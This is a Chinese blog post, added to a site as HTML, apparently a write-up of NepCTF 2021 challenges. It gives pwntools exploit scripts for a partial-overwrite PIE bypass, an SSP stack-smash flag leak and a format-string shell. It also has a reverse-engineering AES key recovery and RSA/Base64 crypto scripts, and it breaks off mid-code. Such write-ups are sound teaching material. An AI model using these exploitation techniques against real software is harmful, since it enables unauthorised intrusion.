@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"moe.lovmayoi.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":260,"display":"always","padding":10,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Nepnep办的娱乐赛，确实很娱乐（bushi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF 2021 WriteUp">
+<meta property="og:url" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/index.html">
+<meta property="og:site_name" content="Shrimpwr&#39;s Blog">
+<meta property="og:description" content="Nepnep办的娱乐赛，确实很娱乐（bushi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img1.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img2.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img3.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img4.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img5.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img6.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img7.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img8.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img9.png">
+<meta property="og:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img10.png">
+<meta property="article:published_time" content="2021-03-22T11:05:04.000Z">
+<meta property="article:modified_time" content="2021-03-22T11:31:11.410Z">
+<meta property="article:author" content="Shrimpwr">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/img1.png">
+
+<link rel="canonical" href="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NepCTF 2021 WriteUp | Shrimpwr's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167856942-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-167856942-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?117888d7b8203c259ff2167ff11fbc4b";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+   
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Shrimpwr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Time to mix drinks.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">12</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://moe.lovmayoi.top/2021/03/22/NepCTF2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Shrimpwr">
+      <meta itemprop="description" content="无数渺小的思考填满了人的一生">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shrimpwr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NepCTF 2021 WriteUp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-22 19:05:04 / 修改时间：19:31:11" itemprop="dateCreated datePublished" datetime="2021-03-22T19:05:04+08:00">2021-03-22</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>15k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Nepnep办的娱乐赛，确实很娱乐（bushi</p>
+<a id="more"></a>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="签到-送你一朵小红花"><a href="#签到-送你一朵小红花" class="headerlink" title="[签到] 送你一朵小红花"></a>[签到] 送你一朵小红花</h3><p>首先checksec发现保护全开，此处重点关注PIE  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;shrimpwr&#x2F;myfiles&#x2F;learning&#x2F;nepctf2021&#x2F;xhh&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p>用IDA可以看到，程序首先计算出了PIE保护后，sub_125D到sub_1651（不包括sub_14E1）中某个函数的真实地址，然后将其存入buf[2]，之后是用户输入，输入被存入buf，然后call buf[2]调用函数  </p>
+<img src="/2021/03/22/NepCTF2021/img1.png" class="">  
+<img src="/2021/03/22/NepCTF2021/img2.png" class="">
+<p>而实际上获取flag的函数是sub_14E1，所以需要进行partial write覆盖buf[2]的低位（后三位固定，第四位需要爆破），绕过PIE，从而调用sub_14E1，获取flag</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy.random._examples.cython</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">list1 = [<span class="string">b"\x04"</span>, <span class="string">b"\x14"</span>, <span class="string">b"\x24"</span>,<span class="string">b"\x34"</span>,<span class="string">b"\x44"</span>,<span class="string">b"\x54"</span>,<span class="string">b"\x64"</span>,<span class="string">b"\x74"</span>,<span class="string">b"\x84"</span>,<span class="string">b"\x94"</span>,<span class="string">b"\xa4"</span>,<span class="string">b"\xb4"</span>,<span class="string">b"\xc4"</span>,<span class="string">b"\xd4"</span>,<span class="string">b"\xe4"</span>,<span class="string">b"\xf4"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">"./xhh"</span>)</span><br><span class="line">        <span class="comment"># sh = remote('node2.hackingfor.fun',39379)</span></span><br><span class="line">        <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">        payload = <span class="string">b"A"</span> * <span class="number">16</span> + <span class="string">b'\xe1'</span> + random.sample(list1,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">        sh.send(payload)</span><br><span class="line">        print(sh.recv())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sh.close()</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure>
+<h3 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h3><p>checksec显示没开canary，但是用IDA可以很明显地看出有canary保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;shrimpwr&#x2F;myfiles&#x2F;learning&#x2F;nepctf2021&#x2F;easystack&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<img src="/2021/03/22/NepCTF2021/img3.png" class="">
+<p>此处的sub_443890就是_stack_chk_fail函数，继续分析发现flag已经被sub_4009AE复制到了unk_6CDE20的位置</p>
+<img src="/2021/03/22/NepCTF2021/img4.png" class="">
+<p>这就满足了ssp攻击的条件，栈溢出覆盖argv[0]为flag的地址，然后触发_stack_chk_fail，就能打印出flag</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./easystack"</span>)</span><br><span class="line"><span class="comment"># sh = remote("node2.hackingfor.fun", 35990)</span></span><br><span class="line">flag_addr = <span class="number">0x6CDE20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x7fffffffe2b8</span> - (<span class="number">0x7fffffffe180</span> - <span class="number">0x90</span>)) + p64(flag_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="scmt"><a href="#scmt" class="headerlink" title="scmt"></a>scmt</h3><p>IDA查看main函数，很明显的格式化字符串漏洞</p>
+<img src="/2021/03/22/NepCTF2021/img5.png" class="">
+<p>格式化字符串不是存放在栈上而是在bss段，但是并不影响此处的利用。</p>
+<p>分析可以发现程序在输入名字后会继续要求我们输入一个数字，然后将这个数字与前面sub_400A13随机初始化的一个变量比较，如果相等就执行<code>system(&quot;/bin/sh&quot;)</code>，否则退出</p>
+<p>被用来比较的变量存放在 [rbp-0x10] 的位置，gdb调试，断在第二个printf之前，查看此时栈的结构</p>
+<img src="/2021/03/22/NepCTF2021/img6.png" class="">
+<p>0x7fffffffe180 处存放的值就是该变量，所以只要输入的格式化字符串是<code>%8$x</code>, 就可以打印出该处的值，转成十进制再输回去就能getshell了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./scmt"</span>)</span><br><span class="line"><span class="comment"># sh = remote("node2.hackingfor.fun", 34043)</span></span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b'%8$x'</span>)</span><br><span class="line">num = sh.recvuntil(<span class="string">b"G"</span>)[<span class="number">29</span>:<span class="number">-1</span>]</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(str(int(num.decode(), <span class="number">16</span>)).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="easycsharp"><a href="#easycsharp" class="headerlink" title="easycsharp"></a>easycsharp</h3><p>直接用ILSpy打开就能看见源码，逻辑很清晰，要求输入的字符串是<code>Nep{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</code>的形式，并且以给定的密钥进行AES加密后，等于<code>1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0</code></p>
+<img src="/2021/03/22/NepCTF2021/img7.png" class="">
+<p>用脚本可以算出密钥，是<code>badbadwomen!!!!!!!!!!!!!!!!!!!!!</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">s = [<span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">92</span>, <span class="number">94</span>,<span class="number">86</span>,<span class="number">93</span>,<span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>,<span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>,<span class="number">18</span>, <span class="number">18</span>]</span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    a = chr(i ^ <span class="number">0x33</span>)</span><br><span class="line">    ss += a</span><br><span class="line">print(ss)</span><br></pre></td></tr></table></figure>
+<img src="/2021/03/22/NepCTF2021/img8.png" class="">
+<p>在AesEncrypt中可以看到加密模式是ECB，填充方式是PKCS7，然后随便找个在线网站解密就行了</p>
+<img src="/2021/03/22/NepCTF2021/img9.png" class="">
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Real-Base"><a href="#Real-Base" class="headerlink" title="Real_Base"></a>Real_Base</h3><p>从给出的脚本可以看出是变种Base64，而且给了一组对应的编码和明文，可以逆推出字母表</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">"rTcb1BR8YVW2EOUjweXpIiLt5QCNg7ZAsD9muq3ylMhvofnx/P"</span></span><br><span class="line">e_m = <span class="string">"2Br9y9fcu97zvB2OruZv0D3Bwhbj0uNQnvfdtC2TwAfPrdBJ3xeP4wNn0hzLzCVUlRa="</span></span><br><span class="line">e_flag = <span class="string">"tCvM4R3TzvZ7nhjBxSiNyxmP28e7qCjVxQn91SRM3gBKzxQ="</span></span><br><span class="line"></span><br><span class="line">b_char = dict()</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">binstr=[ bin(ord(m[i])).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m))]</span><br><span class="line">p1=len(binstr) // <span class="number">3</span></span><br><span class="line">p2=len(binstr) % <span class="number">3</span></span><br><span class="line">part1 = binstr[<span class="number">0</span>:<span class="number">3</span>*p1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(p1):</span><br><span class="line">    str_p1=binstr[i*<span class="number">3</span>]+binstr[i*<span class="number">3</span>+<span class="number">1</span>]+binstr[i*<span class="number">3</span>+<span class="number">2</span>]</span><br><span class="line">    tmp_str = [str_p1[x: x + <span class="number">6</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line">    <span class="comment"># tmp_res = [b_char[int(x,2)]for x in tmp_str]</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> tmp_str:</span><br><span class="line">        b_char[int(x, <span class="number">2</span>)] = e_m[cnt]</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> p2:</span><br><span class="line">    part2 = binstr[<span class="number">3</span>*p1:]</span><br><span class="line">    str_p2 = <span class="string">''</span>.join(part2)+(<span class="number">3</span>-p2)*<span class="string">'0'</span>*<span class="number">8</span></span><br><span class="line">    tmp_str = [str_p2[x: x + <span class="number">6</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:p2+<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># tmp_res = [b_char[int(x,2)]for x in tmp_str]</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> tmp_str:</span><br><span class="line">        b_char[int(x, <span class="number">2</span>)] = e_m[cnt]</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span> &lt;&lt; <span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> b_char:</span><br><span class="line">        table += b_char[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">print(table)</span><br></pre></td></tr></table></figure>
+<p>输出结果是<code>abcdefhjlnrtuvwxyz023479ABCDJLNOPQRTUVZ</code>，虽然不完整，但显然就是<code>a-z0-9A-Z+/=</code>，然后丢到Cyberchef解码得到flag</p>
+<img src="/2021/03/22/NepCTF2021/img10.png" class="">
+<h3 id="你们一天天的不写代码，难道是在等爱情吗"><a href="#你们一天天的不写代码，难道是在等爱情吗" class="headerlink" title="你们一天天的不写代码，难道是在等爱情吗"></a>你们一天天的不写代码，难道是在等爱情吗</h3><p>包含了标准银河字母，盲文，精灵语，跳舞的小人，猪圈密码等，对照着写出原文，然后 3 栏 W 型栅栏解密，再 ROT13 就行了</p>
+<p>小丑竟是我自己.jpg</p>
+<h3 id="ChildRSA"><a href="#ChildRSA" class="headerlink" title="ChildRSA"></a>ChildRSA</h3><p>从给出的脚本可以看出，flag1的部分是很明显的Coppersmith Short-Pad Attack，使用来自 <a href="https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/FranklinReiter.sage" target="_blank" rel="noopener">https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/FranklinReiter.sage</a> 的脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/10/27 12:26</span></span><br><span class="line"><span class="comment"># @Author : A.James</span></span><br><span class="line"><span class="comment"># @FileName: tt3.py</span></span><br><span class="line"><span class="comment"># Franklin-Reiter attack against RSA.</span></span><br><span class="line"><span class="comment"># If two messages differ only by a known fixed difference between the two messages</span></span><br><span class="line"><span class="comment"># and are RSA encrypted under the same RSA modulus N</span></span><br><span class="line"><span class="comment"># then it is possible to recover both of them.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inputs are modulus, known difference, ciphertext 1, ciphertext2.</span></span><br><span class="line"><span class="comment"># Ciphertext 1 corresponds to smaller of the two plaintexts. (The one without the fixed difference added to it)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">franklinReiter</span><span class="params">(n,e,r,c1,c2)</span>:</span></span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X + r)^e - c2</span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">  <span class="comment"># GCD is not implemented for rings over composite modulus in Sage</span></span><br><span class="line">  <span class="comment"># so we do our own implementation. Its the exact same as standard GCD, but with</span></span><br><span class="line">  <span class="comment"># the polynomials monic representation</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compositeModulusGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CoppersmithShortPadAttack</span><span class="params">(e,n,C1,C2,eps=<span class="number">1</span>/<span class="number">30</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Coppersmith's Shortpad attack!</span></span><br><span class="line"><span class="string">    Figured out from: https://en.wikipedia.org/wiki/Coppersmith's_attack#Coppersmith.E2.80.99s_short-pad_attack</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    ZmodN = Zmod(n)</span><br><span class="line">    g1 = x^e - C1</span><br><span class="line">    g2 = (x+y)^e - C2</span><br><span class="line">    res = g1.resultant(g2)</span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(ZmodN)</span><br><span class="line">    <span class="comment"># Convert Multivariate Polynomial Ring to Univariate Polynomial 